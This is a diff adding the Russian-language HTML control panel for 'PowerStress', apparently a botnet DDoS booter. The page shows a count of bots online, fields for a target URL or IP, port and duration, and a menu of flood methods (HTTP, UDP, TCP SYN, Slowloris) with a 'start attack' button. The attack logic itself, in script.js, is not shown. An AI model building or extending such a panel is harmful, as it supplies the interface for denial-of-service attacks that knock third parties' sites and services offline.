@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>PowerStress - Панель управления</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛡️ PowerStress</h1>
+            <div class="stats">
+                <span id="onlineCount">0</span> ботов онлайн
+            </div>
+        </header>
+
+        <div class="attack-panel">
+            <h2>📡 Запуск атаки</h2>
+            <form id="attackForm">
+                <div class="input-group">
+                    <label>Целевой URL/IP:</label>
+                    <input type="text" id="target" placeholder="example.com или 192.168.1.1" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>Порт:</label>
+                    <input type="number" id="port" value="80" required>
+                </div>
+
+                <div class="input-group">
+                    <label>Длительность (секунд):</label>
+                    <input type="number" id="duration" value="60" required>
+                </div>
+
+                <div class="input-group">
+                    <label>Метод атаки:</label>
+                    <select id="method">
+                        <option value="http">HTTP Flood</option>
+                        <option value="udp">UDP Flood</option>
+                        <option value="tcp">TCP SYN</option>
+                        <option value="slowloris">Slowloris</option>
+                    </select>
+                </div>
+
+                <button type="submit" class="attack-btn">🚀 Начать атаку</button>
+            </form>
+        </div>
+
+        <div class="status-panel">
+            <h2>📊 Статус атаки</h2>
+            <div id="attackStatus">Ожидание команды...</div>
+            <div class="progress-bar">
+                <div id="progress" class="progress"></div>
+            </div>
+        </div>
+
+        <div class="log-panel">
+            <h2>📝 Лог действий</h2>
+            <div id="log" class="log"></div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
